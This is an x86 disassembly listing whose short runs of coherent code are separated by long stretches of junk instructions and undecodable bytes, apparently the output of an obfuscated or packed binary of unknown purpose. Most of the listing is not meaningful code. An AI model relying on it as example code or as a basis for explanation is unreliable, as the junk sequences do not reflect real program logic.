  4020e9:	sbb    eax,0xd51c6f74
  4020ee:	xor    eax,0xbbf42cc5
  4020f3:	movups XMMWORD PTR ds:0x723d728a,xmm4
  4020fa:	int    0xea
  4020fc:	pop    ss
  4020fd:	inc    ebp
  4020fe:	inc    eax
  4020ff:	mov    ah,0xef
  402101:	fs pop ebp
  402103:	adc    edi,0x73bd01e9
  402109:	cmp    eax,DWORD PTR [eax-0x6eadfc87]
  40210f:	mov    ecx,0x274a5705
  402114:	daa    
  402115:	push   0xc2448a10
  40211a:	pop    esp
  40211b:	add    eax,0x66bf0731
  402120:	addr16 dec eax
  402122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402123:	aas    
  402124:	in     eax,0xee
  402126:	scas   al,BYTE PTR es:[edi]
  402127:	mov    edx,0xbe0ecf2b
  40212c:	imul   eax,DWORD PTR [ebp-0x74bd41c6],0xffffffd7
  402133:	lods   eax,DWORD PTR ds:[esi]
  402134:	mov    edx,0x2a323825
  402139:	out    0xe1,eax
  40213b:	rcl    DWORD PTR ds:0x20a54606,cl
  402141:	popf   
  402142:	xor    DWORD PTR [esi-0x4e],ebp
  402145:	or     edx,DWORD PTR [eax+0x19ace643]
  40214b:	add    esp,DWORD PTR [ecx]
  40214d:	repnz stc 
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	adc    DWORD PTR [ebx+0x3a],0x4a
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402167
  402176:	test   ecx,ecx
  402178:	aaa    
  402179:	xchg   BYTE PTR [edx+0x2c3fe4bd],bh
  40217f:	xchg   ebp,eax
  402180:	test   al,0x98
  402182:	daa    
  402183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402184:	dec    edx
  402185:	shl    DWORD PTR [esi+0x3cfd7cac],1
  40218b:	pop    ecx
  40218c:	and    DWORD PTR [edx-0x1b],eax
  40218f:	gs and al,0x8
  402192:	sti    
  402193:	stc    
  402194:	ds je  0x4021d3
  402197:	xor    bl,cl
  402199:	fcomp  QWORD PTR [eax-0x651ad045]
  40219f:	pop    ebx
  4021a0:	test   DWORD PTR [edx-0x356e5f8d],ebx
  4021a6:	neg    DWORD PTR [ecx+0x64be3576]
  4021ac:	in     eax,dx
  4021ad:	xlat   BYTE PTR ds:[ebx]
  4021ae:	cmp    bl,BYTE PTR [edi]
  4021b0:	je     0x402219
  4021b2:	mov    ch,0x4f
  4021b4:	jbe    0x402174
  4021b6:	jb     0x4021d1
  4021b8:	inc    eax
  4021b9:	push   es
  4021ba:	addr16 cmp al,al
  4021bd:	add    al,0x3b
  4021bf:	mov    esp,0xd28cef7d
  4021c4:	xchg   BYTE PTR [edi-0x48],cl
  4021c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c8:	lea    esi,[ebx+0x3d]
  4021cb:	mov    al,ds:0x2b051a89
  4021d0:	ror    ch,1
  4021d2:	(bad)  
  4021d3:	jle    0x402222
  4021d5:	in     al,0x21
  4021d7:	inc    ecx
  4021d8:	inc    edx
  4021d9:	mov    ah,0xd9
  4021db:	push   edi
  4021dc:	xor    eax,0xb37d60b5
  4021e1:	sub    eax,0xf1596538
  4021e6:	into   
  4021e7:	das    
  4021e8:	sbb    BYTE PTR [edx-0x11],0xcd
  4021ec:	imul   eax,DWORD PTR [ebx+0x2189d4af],0xffffffc7
  4021f3:	neg    BYTE PTR ds:0xb828b827
  4021f9:	mov    dh,0x9d
  4021fb:	add    DWORD PTR [edx],esp
  4021fd:	shr    DWORD PTR [edx],1
  4021ff:	xor    al,0x4b
  402201:	mov    edx,0x70d20b5a
  402206:	xchg   edx,eax
  402207:	out    0x1b,eax
  402209:	sbb    bl,BYTE PTR [eax]
  40220b:	push   ecx
  40220c:	pop    ebx
  40220d:	leave  
  40220e:	aad    0xe3
  402210:	call   0x80981b93
  402215:	sbb    ebp,DWORD PTR [ebp-0x63]
  402218:	mov    bl,BYTE PTR cs:[esi-0x52]
  40221c:	sub    eax,0xdc3b784e
  402221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402222:	mov    ah,0xef
  402224:	cli    
  402225:	mov    cs,eax
  402227:	pop    es
  402228:	sub    edi,DWORD PTR [esi+0x7f]
  40222b:	jmp    0x7e50:0x4421c3f1
  402232:	fstp   QWORD PTR [ecx-0x3e]
  402235:	mov    dl,0xb8
  402237:	pop    ebx
  402238:	lea    eax,[ebp+0x60]
  40223b:	pop    edi
  40223c:	xchg   ebx,eax
  40223d:	or     ebx,DWORD PTR [ebp+0xb]
  402240:	cli    
  402241:	test   eax,0x3bd8100a
  402246:	mov    eax,ds:0x99ba2809
  40224b:	xchg   esi,eax
  40224c:	call   0x5da67af4
  402251:	push   eax
  402252:	inc    ecx
  402253:	mov    dh,0x25
  402256:	shr    DWORD PTR [esi+0x35],1
  402259:	dec    ebp
  40225a:	xchg   BYTE PTR ds:0x9cf58961,dl
  402260:	dec    ebx
  402261:	mov    al,ds:0xba308957
  402266:	call   0xd31e0062
  40226b:	data16 jo 0x402297
  40226e:	sti    
  40226f:	js     0x402233
  402271:	cld    
  402272:	mov    bh,0xa1
  402274:	loope  0x40229f
  402276:	pop    edx
  402277:	sbb    DWORD PTR [ebx-0x26],ebx
  40227a:	stos   DWORD PTR es:[edi],eax
  40227b:	cmp    al,0xb8
  40227d:	push   edx
  40227e:	jecxz  0x402280
  402280:	ins    BYTE PTR es:[edi],dx
  402281:	mov    bh,0xbf
  402283:	rol    BYTE PTR [ebx+0x3f828e5],0x3b
  40228a:	inc    edi
  40228b:	push   es
  40228c:	dec    eax
  40228d:	cmc    
  40228e:	pusha  
  40228f:	jg     0x402304
  402291:	jp     0x402252
  402293:	rol    bl,cl
  402295:	mov    ah,0xca
  402297:	imul   esp,ebx,0xffffffb1
  40229a:	and    ebx,DWORD PTR ds:0xf32d67de
  4022a0:	aam    0x52
  4022a2:	mov    ebx,0x8b1657c6
  4022a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a8:	test   al,0x6c
  4022aa:	enter  0x9b61,0x70
  4022ae:	or     DWORD PTR [ecx+0x69],ebx
  4022b1:	push   edi
  4022b2:	fcomp  DWORD PTR [eax-0x17]
  4022b5:	xchg   esp,eax
  4022b6:	jl     0x402311
  4022b8:	shr    BYTE PTR [ebx],cl
  4022ba:	popf   
  4022bb:	jl     0x40227e
  4022bd:	jne    0x402246
  4022bf:	repnz mov ds:0xddc4c14,eax
  4022c5:	aam    0x82
  4022c7:	rcl    BYTE PTR [ebx+0x1e],1
  4022ca:	cmp    al,0x61
  4022cc:	inc    ecx
  4022cd:	pop    ecx
  4022ce:	jbe    0x40225a
  4022d0:	lods   al,BYTE PTR ds:[esi]
  4022d1:	adc    ecx,DWORD PTR [edi]
  4022d3:	dec    ebp
  4022d4:	push   cs
  4022d5:	movlps QWORD PTR [esi],xmm0
  4022d8:	xchg   esp,eax
  4022d9:	dec    esp
  4022da:	in     eax,dx
  4022db:	mov    BYTE PTR [esi],ch
  4022dd:	mov    dl,0xcf
  4022df:	and    cl,BYTE PTR ds:0xb89459c6
  4022e5:	inc    DWORD PTR [ebp-0x7a6b738f]
  4022eb:	pop    ss
  4022ec:	push   cs
  4022ed:	cli    
  4022ee:	imul   ebp,DWORD PTR [ebx+0x4],0x77
  4022f2:	jg     0x402359
  4022f4:	mov    BYTE PTR [ebx-0x75],dh
  4022f7:	sub    edi,eax
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	out    0x0,eax
  402359:	add    al,0xf9
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x40238c
  402364:	je     0x4022e6
  402366:	jge    0x402316
  402368:	rcl    ebx,cl
  40236a:	cli    
  40236b:	enter  0xbbcb,0x95
  40236f:	xor    al,0x49
  402371:	fist   WORD PTR [ecx+0x7e]
  402374:	ins    DWORD PTR es:[edi],dx
  402375:	outs   dx,DWORD PTR ds:[esi]
  402376:	and    al,0x2b
  402378:	jmp    0x402326
  40237a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40237b:	mov    fs,WORD PTR [ebp-0x7]
  40237e:	inc    ecx
  40237f:	xchg   edx,eax
  402380:	aam    0x49
  402382:	pop    esp
  402383:	xchg   edx,eax
  402384:	push   esp
  402385:	mov    ds:0xae182c7a,eax
  40238a:	jge    0x4023f9
  40238c:	pop    ds
  40238d:	xor    BYTE PTR [edi+ebx*1+0x47],0x63
  402392:	das    
  402393:	and    DWORD PTR [esp+edx*2-0x23d843b3],esi
  40239a:	push   edi
  40239b:	xchg   edi,eax
  40239c:	mov    al,0x25
  40239e:	cmp    ch,dl
  4023a0:	pop    ebp
  4023a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023a2:	xlat   BYTE PTR ds:[ebx]
  4023a3:	mov    ebp,ds
  4023a5:	repz mov WORD PTR ds:0xbdc69f9b,gs
  4023ac:	mov    ebx,0xfd1f72e3
  4023b1:	jo     0x402408
  4023b3:	aam    0x48
  4023b5:	fiadd  DWORD PTR [ebx]
  4023b7:	mov    bh,0xe0
  4023b9:	mov    ch,0xda
  4023bb:	rcr    BYTE PTR [ebp-0x57],cl
  4023be:	push   cs
  4023bf:	loope  0x402440
  4023c1:	inc    eax
  4023c2:	push   ds
  4023c3:	sbb    eax,0xc6d80a38
  4023c8:	in     eax,0xe0
  4023ca:	adc    al,0xed
  4023cc:	inc    edx
  4023cd:	(bad)  
  4023ce:	cli    
  4023cf:	in     al,0x91
  4023d1:	and    eax,0xbf5ca4a9
  4023d6:	sub    eax,0xf2bd35f7
  4023db:	cmp    BYTE PTR [ecx-0x4d8046a7],bl
  4023e1:	push   ss
  4023e2:	ret    0xad77
  4023e5:	sbb    DWORD PTR [eax-0x42],0xef70f1c3
  4023ec:	mov    ah,0x70
  4023ee:	retf   0xc7d1
  4023f1:	sahf   
  4023f2:	enter  0xafe7,0xab
  4023f6:	int    0x62
  4023f8:	clc    
  4023f9:	or     al,0xf6
  4023fb:	rol    DWORD PTR [ebx+ecx*4+0x6d1bbf5],0x26
  402403:	cmp    esp,edi
  402405:	mov    ebp,0xef8f85d0
  40240a:	push   ds
  40240b:	or     eax,0x9764ef26
  402410:	or     esp,ebp
  402412:	test   DWORD PTR [eax+ebp*1+0x3a68f33f],esp
  402419:	inc    edx
  40241a:	push   ecx
  40241b:	and    edi,DWORD PTR [edx+0x8]
  40241e:	aad    0x31
  402420:	mov    edi,0x1fec772f
  402425:	cs dec eax
  402427:	adc    eax,0x5cf1cf70
  40242c:	mov    ss,WORD PTR [eax+0x7b]
  40242f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402430:	test   DWORD PTR [ebp+0x3c],esp
  402433:	cmp    al,0x85
  402435:	push   es
  402436:	cmp    ebp,ebx
  402438:	dec    eax
  402439:	push   cs
  40243a:	mov    ds:0x1e2e14f7,al
  40243f:	mov    eax,ds:0xba9a0ae9
  402444:	fnstcw WORD PTR [edi]
  402446:	cmp    BYTE PTR [ebx],bl
  402448:	mov    WORD PTR [esp+ecx*8+0xb],ss
  40244c:	outs   dx,DWORD PTR ds:[esi]
  40244d:	clc    
  40244e:	push   es
  40244f:	add    edi,0x845f5305
  402455:	mov    ebx,0xab601591
  40245a:	jle    0x402464
  40245c:	mov    WORD PTR [esi-0x3a37d20e],cs
  402462:	test   al,0xd6
  402464:	or     DWORD PTR [eax],eax
  402466:	daa    
  402467:	mov    ebx,DWORD PTR [ecx-0x9]
  40246a:	jno    0x402412
  40246c:	sub    BYTE PTR [edx+0x2d7a1302],bh
  402472:	and    ah,ch
  402474:	fwait
  402475:	push   ds
  402476:	mov    eax,0x3d764318
  40247b:	shl    DWORD PTR [ecx],0xbf
  40247e:	and    ah,BYTE PTR [edx-0x73]
  402481:	add    BYTE PTR [edi-0x7f14ade8],0x7a
  402488:	std    
  402489:	add    eax,0x720cc27e
  40248e:	mov    edx,0xb0200572
  402493:	sub    bh,BYTE PTR [ebx-0x122d7d2c]
  402499:	inc    esp
  40249a:	fucomp st(7)
  40249c:	stos   DWORD PTR es:[edi],eax
  40249d:	or     al,0xba
  40249f:	jecxz  0x40245f
  4024a1:	adc    esi,ebp
  4024a3:	adc    BYTE PTR [edx+0x7a],dl
  4024a6:	ja     0x4024d2
  4024a8:	jb     0x40246c
  4024aa:	mov    eax,0x3aa3b342
  4024af:	pop    eax
  4024b0:	cmp    esi,DWORD PTR [edi-0x23]
  4024b3:	cld    
  4024b4:	icebp  
  4024b5:	inc    DWORD PTR [edx+0x4f]
  4024b8:	clc    
  4024b9:	fistp  DWORD PTR [ebx]
  4024bb:	in     al,dx
  4024bc:	les    esi,FWORD PTR [edi+0x7eb341d2]
  4024c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c3:	in     al,dx
  4024c4:	ds adc cl,0x16
  4024c8:	out    dx,al
  4024c9:	xor    ch,BYTE PTR [esi+0x464d31c7]
  4024cf:	call   0x622f5109
  4024d4:	or     DWORD PTR [ebp+0x3fb6186e],ecx
  4024da:	dec    edx
  4024db:	repz pushf 
  4024dd:	push   edx
  4024de:	sub    eax,0x1a081813
  4024e3:	imul   esi,DWORD PTR [ecx+0xe],0xf0458b80
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	daa    
  40250e:	cmp    al,0xe2
  402510:	aaa    
  402511:	add    DWORD PTR es:[esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402549
  40251a:	dec    ebx
  40251b:	bound  ecx,QWORD PTR [edi-0xf]
  40251e:	(bad)  
  40251f:	xlat   BYTE PTR ds:[ebx]
  402520:	aas    
  402521:	push   ebx
  402522:	add    DWORD PTR [eax-0x7d],ecx
  402525:	mov    ds:0x3e1083fc,al
  40252a:	sub    edi,DWORD PTR [edi]
  40252c:	fs das 
  40252e:	mov    ds:0x8db63a2,al
  402533:	pop    eax
  402534:	in     eax,0x79
  402536:	jecxz  0x4024d0
  402538:	test   DWORD PTR [esi-0x2d],0x7f44bca7
  40253f:	fst    DWORD PTR [ecx+0x60bea7aa]
  402545:	mul    BYTE PTR [ebx-0xd]
  402548:	fwait
  402549:	pop    esi
  40254a:	in     al,dx
  40254b:	or     dl,ch
  40254d:	mov    edi,0x61ed1d88
  402552:	cmp    al,0x1c
  402554:	imul   esi,DWORD PTR [ecx-0x23386fd0],0x99a1a569
  40255e:	jae    0x4025da
  402560:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  402562:	mov    al,0x53
  402564:	push   es
  402565:	int    0x2
  402567:	std    
  402568:	mov    ecx,?
  40256a:	es cld 
  40256c:	add    cl,0x45
  40256f:	xchg   DWORD PTR [ecx+0x31],ebx
  402572:	iret   
  402573:	fdiv   st(5),st
  402575:	cmp    ah,bl
  402577:	inc    edi
  402578:	loop   0x4025bf
  40257a:	out    dx,al
  40257b:	ss iret 
  40257d:	push   ecx
  40257e:	push   ebp
  40257f:	inc    eax
  402580:	mov    ebp,DWORD PTR [esi+0x1a]
  402583:	sbb    al,0xe0
  402585:	repz repnz push edx
  402588:	call   FWORD PTR [ebp-0x62]
  40258b:	sbb    eax,0xd030182e
  402590:	jnp    0x4025e9
  402592:	cmp    BYTE PTR [ebx-0x205f845a],0xc1
  402599:	arpl   bp,bp
  40259b:	daa    
  40259c:	fsubrp st(7),st
  40259e:	fidivr DWORD PTR [ecx]
  4025a0:	xor    eax,0xf459cfd
  4025a5:	popf   
  4025a6:	loopne 0x4025ac
  4025a8:	retf   0x6d65
  4025ab:	push   0x1e97eb5c
  4025b0:	daa    
  4025b1:	mov    bh,0xc0
  4025b3:	test   al,0x5a
  4025b5:	jle    0x40254f
  4025b7:	inc    ecx
  4025b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b9:	and    cl,ch
  4025bb:	mov    al,0x7c
  4025bd:	inc    ebx
  4025be:	xor    DWORD PTR ds:0x1a69ed18,esp
  4025c4:	xlat   BYTE PTR ds:[ebx]
  4025c5:	into   
  4025c6:	mov    esi,DWORD PTR [esi+eax*1]
  4025c9:	std    
  4025ca:	push   cs
  4025cb:	xchg   edx,eax
  4025cc:	fnstenv [ebx-0x52]
  4025cf:	std    
  4025d0:	jno    0x4025a7
  4025d2:	ss cmp eax,0x539ec120
  4025d8:	dec    esp
  4025d9:	shl    ah,0xd
  4025dc:	cmp    eax,0x4872a56a
  4025e1:	mov    cl,0x4c
  4025e3:	imul   esi,DWORD PTR [eax+0xc6b0491],0xffffffec
  4025ea:	mov    ah,0x6a
  4025ec:	and    al,BYTE PTR [ebx+0x64a75789]
  4025f2:	or     DWORD PTR [ecx-0x41],0xffffff8f
  4025f6:	pop    es
  4025f7:	xchg   edx,eax
  4025f8:	cmp    DWORD PTR [edx],ebx
  4025fa:	adc    cl,BYTE PTR [ebx+0x679a45f2]
  402600:	in     al,0x3f
  402602:	fucomp st(6)
  402604:	imul   bl
  402606:	(bad)
  40260a:	jge    0x40266d
  40260c:	retf   
  40260d:	push   ds
  40260e:	scas   eax,DWORD PTR es:[edi]
  40260f:	mov    al,0x14
  402611:	imul   BYTE PTR [edi-0x413b956e]
  402617:	lods   al,BYTE PTR ds:[esi]
  402618:	fnstenv [ebx+0x7b]
  40261b:	pusha  
  40261c:	pusha  
  40261d:	adc    al,0x7c
  40261f:	das    
  402620:	cmp    al,0xc
  402622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402623:	pop    esi
  402624:	jmp    0xce7195c6
  402629:	test   dh,bh
  40262b:	lds    ebp,FWORD PTR [esi-0x8bd901e]
  402631:	pop    eax
  402632:	shr    BYTE PTR [edi+eax*8],0xf7
  402636:	adc    eax,0x95abd0ee
  40263b:	mov    DWORD PTR [ecx-0x77696d88],ecx
  402641:	dec    esp
  402642:	sub    al,BYTE PTR [edx]
  402644:	push   esp
  402645:	adc    cl,BYTE PTR ds:0x130227e0
  40264b:	push   ss
  40264c:	add    DWORD PTR [ebx+0x34],edx
  40264f:	ficom  WORD PTR [ebx+0x2914fa4d]
  402655:	adc    edi,DWORD PTR [esi+eax*8-0x47]
  402659:	jg     0x40266d
  40265b:	adc    DWORD PTR [esi],edi
  40265d:	lea    ebx,[edx]
  40265f:	add    BYTE PTR [eax],ah
  402661:	out    0x26,al
  402663:	mov    esp,DWORD PTR [ebx-0x528e162f]
  402669:	stc    
  40266a:	jo     0x402637
  40266c:	mov    DWORD PTR [esi],edi
  40266e:	test   DWORD PTR [ecx+0x7a],ebx
  402671:	iret   
  402672:	(bad)  
  402674:	addr16 jge 0x4026b3
  402677:	test   al,0x51
  402679:	in     eax,dx
  40267a:	nop
  40267b:	je     0x4026f7
  40267d:	les    edx,FWORD PTR [edi]
  40267f:	bound  esp,QWORD PTR [ebp-0x38d75ce4]
  402685:	jp     0x40260e
  402687:	(bad)  
  402688:	pop    esp
  402689:	mov    ebx,0xaef468a4
  40268e:	and    ch,dl
  402690:	fxch   st(4)
  402692:	sbb    DWORD PTR [edx],ebp
  402694:	ret    0x6da8
  402697:	pop    eax
  402698:	lahf   
  402699:	clc    
  40269a:	pop    ebx
  40269b:	cmp    al,BYTE PTR [ecx]
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	xchg   DWORD PTR ds:0xea2408d,esp
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x402708
  4026df:	dec    esp
  4026e0:	loope  0x402711
  4026e2:	(bad)  
  4026e3:	call   0xb5b56fa4
  4026e8:	or     BYTE PTR [ecx-0x7b80fc05],bl
  4026ee:	dec    ecx
  4026ef:	and    dl,bh
  4026f1:	sub    BYTE PTR [edi],al
  4026f3:	cmc    
  4026f4:	push   esi
  4026f5:	sbb    ebp,ebx
  4026f7:	mov    bl,0xbb
  4026f9:	data16 fwait
  4026fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026fc:	pop    esi
  4026fd:	test   eax,0x2d830fe0
  402702:	fist   WORD PTR [ecx]
  402704:	(bad)  
  402705:	sub    al,0x58
  402707:	stos   DWORD PTR es:[edi],eax
  402708:	push   edx
  402709:	mov    ds:0xc4fdc222,eax
  40270e:	int3   
  40270f:	in     al,dx
  402710:	or     BYTE PTR [edx],dh
  402712:	push   esp
  402713:	push   ecx
  402714:	xchg   esi,eax
  402715:	and    DWORD PTR [ebp+0x1],ecx
  402718:	xor    al,0x13
  40271a:	test   al,0x58
  40271c:	xor    BYTE PTR ds:0x27c0c189,bl
  402722:	mov    gs,ebx
  402724:	imul   esp,DWORD PTR [ecx-0x52],0x4f8b6af1
  40272b:	(bad)  
  40272c:	pop    edx
  40272d:	jae    0x402779
  40272f:	pop    edi
  402730:	(bad)  
  402731:	arpl   dx,di
  402733:	add    ch,dl
  402735:	cli    
  402736:	cmp    eax,DWORD PTR [edi+0x6d]
  402739:	xor    ah,0x96
  40273c:	sub    ecx,DWORD PTR [ebx+0x7c67891a]
  402742:	jge    0x4026e5
  402744:	pusha  
  402745:	and    al,0xd
  402747:	mov    ebp,0xfe41e11
  40274c:	popf   
  40274d:	fsub   QWORD PTR [eax]
  40274f:	inc    ebp
  402750:	xor    DWORD PTR [edx-0x71d68d30],0x55
  402757:	fcom   DWORD PTR [edx+0x6c]
  40275a:	sbb    ch,BYTE PTR ds:0xd71da1e9
  402760:	aam    0xf6
  402762:	and    eax,DWORD PTR ds:0xcdc95e81
  402768:	(bad)  
  402769:	addr16 mov dl,0xa1
  40276c:	mov    eax,ds:0x3678df87
  402771:	aaa    
  402772:	jmp    0x4027e0
  402774:	mov    ah,0x90
  402776:	clc    
  402777:	fisttp DWORD PTR [eax-0xb]
  40277a:	inc    edx
  40277b:	dec    esi
  40277c:	and    al,0x2a
  40277e:	fmul   QWORD PTR [ecx-0x59cb9f57]
  402784:	mov    esp,gs
  402786:	add    ebp,DWORD PTR [ebx-0xa]
  402789:	dec    ebp
  40278a:	mov    WORD PTR [edx+0x4d],fs
  40278d:	fist   DWORD PTR ds:0x6b9f76a6
  402794:	out    dx,al
  402795:	retf   
  402796:	stc    
  402797:	inc    DWORD PTR [eax-0x69]
  40279a:	shr    BYTE PTR [edx],cl
  40279c:	cmp    esi,DWORD PTR [eax+0x75b5c6fe]
  4027a2:	inc    ebx
  4027a3:	(bad)  
  4027a4:	lock ret 0x82d7
  4027a8:	sub    ebp,DWORD PTR [esi+0x540b9842]
  4027ae:	push   es
  4027af:	xor    BYTE PTR [edi+0x1a757470],bl
  4027b5:	jg     0x402832
  4027b7:	adc    BYTE PTR [ebp-0x15],0xab
  4027bb:	sbb    eax,0xe80d9a76
  4027c0:	mov    ds:0x39ecde63,al
  4027c5:	pusha  
  4027c6:	sbb    eax,0x4943d3d1
  4027cb:	stc    
  4027cc:	bound  esp,QWORD PTR [esi-0x6e09c32f]
  4027d2:	jae    0x402775
  4027d4:	mov    al,ds:0xc8c9817a
  4027d9:	stos   DWORD PTR es:[edi],eax
  4027da:	(bad)  
  4027db:	sbb    al,0x9f
  4027dd:	enter  0x7e13,0x72
  4027e1:	cmp    DWORD PTR [edi],edi
  4027e3:	pop    edi
  4027e4:	retf   0x71d
  4027e7:	pop    edi
  4027e8:	sbb    bh,BYTE PTR [esi+0x3a]
  4027eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ec:	pop    esi
  4027ed:	fistp  DWORD PTR [eax+0x4605ae35]
  4027f3:	loop   0x402830
  4027f5:	add    BYTE PTR [eax],0xa4
  4027f8:	and    al,0x79
  4027fa:	imul   eax,DWORD PTR [ecx],0x35
  4027fd:	inc    eax
  4027fe:	mov    ecx,0x21940c58
  402803:	daa    
  402804:	scas   al,BYTE PTR es:[edi]
  402805:	rol    BYTE PTR [ebp-0x6c],0x10
  402809:	(bad)  
  40280a:	push   esp
  40280b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40280c:	add    al,0x3e
  40280e:	loope  0x40284f
  402810:	aad    0x5d
  402812:	or     al,al
  402814:	scas   eax,DWORD PTR es:[edi]
  402815:	sti    
  402816:	inc    edx
  402817:	and    bl,BYTE PTR [esi-0x56d1a89b]
  40281d:	ins    BYTE PTR es:[edi],dx
  40281e:	mov    esp,0xda85dfe8
  402823:	jns    0x4027c4
  402825:	mov    esp,0x43772c23
  40282a:	repnz loop 0x402837
  40282d:	add    dl,BYTE PTR [eax]
  40282f:	pushf  
  402830:	pop    es
  402831:	adc    ah,cl
  402833:	or     DWORD PTR [edx+0x539bacb8],0x60
  40283a:	mov    ch,0x29
  40283c:	mov    al,0x5c
  40283e:	int3   
  40283f:	hlt    
  402840:	cdq    
  402841:	lea    ecx,[ecx-0x32]
  402844:	test   eax,0x1f258268
  402849:	test   bl,dh
  40284b:	pop    ds
  40284c:	pop    edx
  40284d:	adc    DWORD PTR [edi+0xaef9249],edx
  402853:	cmp    al,0xd1
  402855:	rcr    DWORD PTR [edi+ecx*4+0x37],cl
  402859:	dec    ecx
  40285a:	das    
  40285b:	mov    ah,0x1a
  40285d:	mov    bh,0xd4
  40285f:	dec    edi
  402860:	cmp    ebp,edi
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	cmc    
  402884:	dec    edi
  402885:	add    eax,0x7e0c2ea7
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402850
  402890:	sub    eax,0xe84f4c6b
  402895:	inc    ebx
  402896:	clc    
  402897:	push   ss
  402898:	dec    ebp
  402899:	and    al,0x5a
  40289b:	mov    WORD PTR [ebx-0x776d632b],ss
  4028a1:	dec    edx
  4028a2:	mov    cl,0xda
  4028a4:	jl     0x402919
  4028a6:	test   BYTE PTR [edi+ebp*8+0x51],cl
  4028aa:	jb     0x402847
  4028ac:	popf   
  4028ad:	add    ecx,DWORD PTR [eax+ecx*8]
  4028b0:	xchg   BYTE PTR [ebx],bh
  4028b2:	fstp   TBYTE PTR [esi+0x7851a885]
  4028b8:	addr16 cmp eax,0x97d462e
  4028be:	fidivr DWORD PTR ds:0xb405ef83
  4028c4:	ins    BYTE PTR es:[edi],dx
  4028c5:	pop    ecx
  4028c6:	and    DWORD PTR [ebx-0x5864f6a0],eax
  4028cc:	cmc    
  4028cd:	mov    ebp,0x36cc2bbb
  4028d2:	test   eax,0xd573b15d
  4028d7:	dec    esp
  4028d8:	(bad)  [edi+0x46]
  4028db:	xor    edi,DWORD PTR [edi+0x60621e93]
  4028e1:	inc    ecx
